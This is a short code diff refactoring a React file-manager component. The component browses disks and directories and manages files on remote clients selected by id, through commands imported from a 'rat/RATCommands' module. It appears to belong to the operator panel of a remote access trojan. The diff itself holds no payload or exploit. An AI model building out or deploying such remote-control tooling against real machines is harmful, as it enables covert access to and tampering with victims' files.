@@ -1,7 +1,7 @@
 import { useEffect, useState, useRef } from "react";
 import { useParams } from "react-router-dom";
-import { invoke } from "@tauri-apps/api/tauri";
 import { FileType } from "../../types";
+import { readFilesCmd, manageFileCmd } from "../rat/RATCommands";
 
 let fileIcon = {
   dir: <i className="ri-folder-fill" style={{ color: "yellow" }}></i>,
@@ -52,19 +52,14 @@ export const FileManager: React.FC = () => {
   }, []);
 
   async function fetchFolder(folder: string) {
-    let ok: Array<string> = await invoke("read_files", {
-      id: id,
-      run: `${
-        folder == "previous"
-          ? "previous_dir"
-          : folder == "disks"
-          ? "available_disks"
-          : "view_dir"
-      }`,
-      path: folder,
-    });
+    let run =
+      folder == "previous"
+        ? "previous_dir"
+        : folder == "disks"
+        ? "available_disks"
+        : "view_dir";
 
-    console.log(ok);
+    let ok = await readFilesCmd(id, run, folder);
 
     setPath(ok[0]);
     setFiles(ok[1] as unknown as Array<FileType>);
@@ -74,11 +69,7 @@ export const FileManager: React.FC = () => {
   }
 
   async function manageFile(command: string, fileName: string) {
-    await invoke("manage_file", {
-      id: id,
-      run: command,
-      file: fileName,
-    });
+    await manageFileCmd(id, command, fileName);
   }
 
   function fileExtension(fileName: string) {
